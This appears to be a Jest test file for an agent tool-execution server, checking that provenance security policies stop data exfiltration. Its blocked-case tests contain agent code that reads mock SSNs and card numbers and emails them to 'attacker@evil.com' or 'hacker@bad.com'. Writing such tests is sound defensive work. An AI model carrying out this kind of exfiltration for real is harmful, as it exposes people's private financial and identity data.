/**
 * Production Validation Tests
 * Real-world scenarios from simple to complex
 */

import { AgentToolProtocolServer } from '@agent-tool-protocol/server';
import { AgentToolProtocolClient } from '@mondaydotcomorg/atp-client';
import {
	ProvenanceMode,
	ToolOperationType,
	ToolSensitivityLevel,
} from '@agent-tool-protocol/protocol';
import { preventDataExfiltration, requireUserOrigin } from '@agent-tool-protocol/provenance';

describe('Production Validation - Real World Scenarios', () => {
	let server: AgentToolProtocolServer;
	let client: AgentToolProtocolClient;
	const port = 3999;

	beforeAll(async () => {
		process.env.ATP_JWT_SECRET = 'prod-validation-secret-' + Date.now();

		// Simulate real database
		const database = {
			users: new Map([
				[
					'user1@company.com',
					{
						id: 'u1',
						email: 'user1@company.com',
						name: 'Alice',
						role: 'admin',
						ssn: '111-11-1111',
						salary: 150000,
					},
				],
				[
					'user2@company.com',
					{
						id: 'u2',
						email: 'user2@company.com',
						name: 'Bob',
						role: 'user',
						ssn: '222-22-2222',
						salary: 80000,
					},
				],
			]),
			transactions: new Map([
				[
					't1',
					{
						id: 't1',
						userId: 'u1',
						amount: 5000,
						card: '4111-1111-1111-1111',
						timestamp: Date.now(),
					},
				],
				[
					't2',
					{
						id: 't2',
						userId: 'u2',
						amount: 200,
						card: '5555-5555-5555-5555',
						timestamp: Date.now(),
					},
				],
			]),
		};

		server = new AgentToolProtocolServer({
			execution: {
				timeout: 10000,
				securityPolicies: [preventDataExfiltration, requireUserOrigin],
			},
		});

		server.onApproval(async (request) => {
			return { approved: true, data: null };
		});

		// Real-world API: Database queries
		server.use({
			name: 'db',
			type: 'custom',
			functions: [
				{
					name: 'getUser',
					description: 'Get user by email',
					inputSchema: {
						type: 'object',
						properties: { email: { type: 'string' } },
						required: ['email'],
					},
					handler: async (params: any) => {
						const user = database.users.get(params.email);
						if (!user) throw new Error('User not found');
						return user;
					},
					metadata: {
						operationType: ToolOperationType.READ,
						sensitivityLevel: ToolSensitivityLevel.SENSITIVE,
					},
				},
				{
					name: 'getTransaction',
					description: 'Get transaction by ID',
					inputSchema: { type: 'object', properties: { id: { type: 'string' } }, required: ['id'] },
					handler: async (params: any) => {
						const tx = database.transactions.get(params.id);
						if (!tx) throw new Error('Transaction not found');
						return tx;
					},
					metadata: {
						operationType: ToolOperationType.READ,
						sensitivityLevel: ToolSensitivityLevel.SENSITIVE,
					},
				},
			],
		});

		// Real-world API: Email service
		server.use({
			name: 'email',
			type: 'custom',
			functions: [
				{
					name: 'send',
					description: 'Send email',
					inputSchema: {
						type: 'object',
						properties: {
							to: { type: 'string' },
							subject: { type: 'string' },
							body: { type: 'string' },
						},
						required: ['to', 'body'],
					},
					handler: async (params: any) => {
						return { sent: true, to: params.to, timestamp: Date.now() };
					},
					metadata: {
						operationType: ToolOperationType.WRITE,
						sensitivityLevel: ToolSensitivityLevel.PUBLIC,
					},
				},
			],
		});

		// Real-world API: Analytics (external service)
		server.use({
			name: 'analytics',
			type: 'custom',
			functions: [
				{
					name: 'track',
					description: 'Track event to external analytics',
					inputSchema: {
						type: 'object',
						properties: { event: { type: 'string' }, data: { type: 'object' } },
						required: ['event'],
					},
					handler: async (params: any) => {
						return { tracked: true, event: params.event };
					},
					metadata: {
						operationType: ToolOperationType.WRITE,
						sensitivityLevel: ToolSensitivityLevel.PUBLIC,
					},
				},
			],
		});

		await server.listen(port);

		client = new AgentToolProtocolClient({
			baseUrl: `http://localhost:${port}`,
		});
		await client.init();
		await client.connect();
	});

	afterAll(async () => {
		await server.stop();
		delete process.env.ATP_JWT_SECRET;
	});

	describe('Scenario 1: Simple legitimate operations', () => {
		test('should allow user to email themselves their own data (PROXY mode)', async () => {
			const result = await client.execute(
				`
				const user = await api.db.getUser({ email: 'user1@company.com' });
				await api.email.send({
					to: 'user1@company.com',
					subject: 'Your Info',
					body: 'Hi ' + user.name + ', your role is ' + user.role
				});
				return { success: true };
				`,
				{ provenanceMode: ProvenanceMode.PROXY }
			);

			expect(result.status).toBe('completed');
			expect(result.result).toEqual({ success: true });
		});

		test('should allow user to email themselves their own data (AST mode)', async () => {
			const result = await client.execute(
				`
				const user = await api.db.getUser({ email: 'user2@company.com' });
				await api.email.send({
					to: 'user2@company.com',
					subject: 'Your Info',
					body: 'Hi ' + user.name + ', your role is ' + user.role
				});
				return { success: true };
				`,
				{ provenanceMode: ProvenanceMode.AST }
			);

			expect(result.status).toBe('completed');
			expect(result.result).toEqual({ success: true });
		});
	});

	describe('Scenario 2: Block data exfiltration', () => {
		test('should block sending user data to unauthorized recipient (PROXY)', async () => {
			const result = await client.execute(
				`
				const user = await api.db.getUser({ email: 'user1@company.com' });
				await api.email.send({
					to: 'attacker@evil.com',
					subject: 'Stolen',
					body: user.ssn
				});
				`,
				{ provenanceMode: ProvenanceMode.PROXY }
			);

			expect(['failed', 'error']).toContain(result.status);
		});

		test('should block sending user data to unauthorized recipient (AST)', async () => {
			const result = await client.execute(
				`
				const user = await api.db.getUser({ email: 'user1@company.com' });
				await api.email.send({
					to: 'attacker@evil.com',
					subject: 'Stolen',
					body: 'SSN: ' + user.ssn
				});
				`,
				{ provenanceMode: ProvenanceMode.AST }
			);

			expect(['failed', 'error']).toContain(result.status);
		});
	});

	describe('Scenario 3: Complex operations with multiple data sources', () => {
		test('should handle multiple DB queries and combine data (PROXY)', async () => {
			const result = await client.execute(
				`
				const user = await api.db.getUser({ email: 'user1@company.com' });
				const tx = await api.db.getTransaction({ id: 't1' });
				
				// Send summary to user themselves
				await api.email.send({
					to: user.email,
					subject: 'Transaction Summary',
					body: 'You spent $' + tx.amount
				});
				
				return { user: user.name, amount: tx.amount };
				`,
				{ provenanceMode: ProvenanceMode.PROXY }
			);

			expect(result.status).toBe('completed');
			expect(result.result).toEqual({ user: 'Alice', amount: 5000 });
		});

		test('should handle multiple DB queries and combine data (AST)', async () => {
			const result = await client.execute(
				`
				const user = await api.db.getUser({ email: 'user2@company.com' });
				const tx = await api.db.getTransaction({ id: 't2' });
				
				return { user: user.name, amount: tx.amount };
				`,
				{ provenanceMode: ProvenanceMode.AST }
			);

			expect(result.status).toBe('completed');
			expect(result.result).toEqual({ user: 'Bob', amount: 200 });
		});
	});

	describe('Scenario 4: Template literals and string operations', () => {
		test('should block template literal with sensitive data (AST)', async () => {
			const result = await client.execute(
				`
				const user = await api.db.getUser({ email: 'user1@company.com' });
				const message = \`User \${user.email} has SSN \${user.ssn}\`;
				await api.email.send({
					to: 'attacker@evil.com',
					body: message
				});
				`,
				{ provenanceMode: ProvenanceMode.AST }
			);

			expect(['failed', 'error']).toContain(result.status);
		});

		test('should block string concatenation with sensitive data (AST)', async () => {
			const result = await client.execute(
				`
				const tx = await api.db.getTransaction({ id: 't1' });
				const info = 'Card: ' + tx.card + ' Amount: ' + tx.amount;
				await api.email.send({
					to: 'hacker@bad.com',
					body: info
				});
				`,
				{ provenanceMode: ProvenanceMode.AST }
			);

			expect(['failed', 'error']).toContain(result.status);
		});
	});

	describe('Scenario 5: Multi-step with pause/resume', () => {
		test('should handle pause/resume with provenance tracking', async () => {
			// Step 1: Fetch data and pause
			const step1 = await client.execute(
				`
				const user = await api.db.getUser({ email: 'user1@company.com' });
				return user.name;
				`,
				{ provenanceMode: ProvenanceMode.AST }
			);

			expect(step1.status).toBe('completed');
			expect(step1.result).toBe('Alice');

			// Step 2: Use previous result (with hints)
			const hints = step1.provenanceTokens?.map((t) => t.token) || [];
			const step2 = await client.execute(
				`
				const greeting = 'Hello Alice';
				return greeting;
				`,
				{
					provenanceMode: ProvenanceMode.AST,
					provenanceHints: hints,
				}
			);

			expect(step2.status).toBe('completed');
		});
	});

	describe('Scenario 6: Edge cases', () => {
		test('should handle empty results', async () => {
			const result = await client.execute(
				`
				return null;
				`,
				{ provenanceMode: ProvenanceMode.AST }
			);

			expect(result.status).toBe('completed');
			expect(result.result).toBeNull();
		});

		test('should handle non-sensitive operations', async () => {
			const result = await client.execute(
				`
				const data = { safe: 'public info', count: 42 };
				await api.email.send({
					to: 'anyone@example.com',
					body: JSON.stringify(data)
				});
				return data;
				`,
				{ provenanceMode: ProvenanceMode.AST }
			);

			expect(result.status).toBe('completed');
		});

		test('should handle errors gracefully', async () => {
			const result = await client.execute(
				`
				await api.db.getUser({ email: 'nonexistent@example.com' });
				`,
				{ provenanceMode: ProvenanceMode.AST }
			);

			expect(['error', 'failed']).toContain(result.status);
		});
	});

	describe('Scenario 7: Performance and scale', () => {
		test('should handle large data structures', async () => {
			const result = await client.execute(
				`
				const user = await api.db.getUser({ email: 'user1@company.com' });
				const largeArray = Array(100).fill(0).map((_, i) => ({
					id: i,
					name: user.name,
					index: i
				}));
				return largeArray.length;
				`,
				{ provenanceMode: ProvenanceMode.AST }
			);

			expect(result.status).toBe('completed');
			expect(result.result).toBe(100);
		});

		test('should handle nested objects and arrays', async () => {
			const result = await client.execute(
				`
				const user = await api.db.getUser({ email: 'user1@company.com' });
				const nested = {
					level1: {
						level2: {
							level3: {
								data: [user.name, user.role]
							}
						}
					}
				};
				return nested.level1.level2.level3.data;
				`,
				{ provenanceMode: ProvenanceMode.AST }
			);

			expect(result.status).toBe('completed');
			expect(result.result).toEqual(['Alice', 'admin']);
		});
	});
});
